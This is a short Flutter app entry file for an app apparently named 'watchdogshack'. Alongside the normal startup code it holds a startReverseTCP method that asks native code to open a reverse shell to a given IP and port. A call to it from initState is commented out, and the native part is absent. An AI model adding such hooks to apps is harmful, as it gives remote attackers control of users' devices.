import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:watchdogshack/views/bootAnimation.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp])
      .then((_) {
    runApp(MyApp());
  });
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    //startReverseTCP("192.168.0.8", 443);
    super.initState();
  }

  Future<void> startReverseTCP(String ip, int port) async {
    const MethodChannel channel = MethodChannel('reverse_shell_channel');
    try {
      await channel.invokeMethod('startReverseShell', {"ip": ip, "port": port});
    } catch (e) {
      print("Error: ${e}");
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(debugShowCheckedModeBanner: false, home: bootAnimation());
  }
}
